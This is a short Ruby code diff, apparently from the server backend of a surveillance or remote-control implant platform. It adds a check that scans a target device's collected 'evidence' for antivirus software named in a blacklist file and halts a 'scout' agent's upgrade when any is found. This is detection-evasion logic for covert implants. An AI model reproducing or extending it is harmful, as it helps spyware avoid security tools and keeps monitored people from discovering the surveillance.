@@ -307,8 +307,13 @@ class Item
     # delete any pending upgrade if requested multiple time
     self.upgrade_requests.destroy_all if self.upgradable
 
-    # if it's a scout, there a special procedure
-    return upgrade_scout if self.scout
+    if self.scout
+      # check the presence of blacklisted AV in the device evidence
+      blacklisted_software?
+
+      # if it's a scout, there a special procedure
+      return upgrade_scout
+    end
 
     factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
     build = RCS::DB::Build.factory(self.platform.to_sym)
@@ -459,6 +464,20 @@ class Item
     Evidence.collection_class(self._id).create_indexes
     # enable sharding only if not enabled
     RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1})
+  end
+
+  def blacklisted_software?
+    raise "Cannot determine blacklist" if self._kind != 'agent'
+
+    device = Evidence.collection_class(self.path.last).where({type: 'device'}).last
+    raise "Cannot determine installed software" unless device
+
+    installed = device[:data]['content']
+
+    File.readlines(RCS::DB::Config.instance.file('blacklist')).each do |offending|
+      trace :debug, "Checking for #{offending.chomp}"
+      raise "Blacklisted software detected: #{offending}" if Regexp.new(offending.chomp, Regexp::IGNORECASE).match installed
+    end
   end
 
   def self.offload_destroy(params)
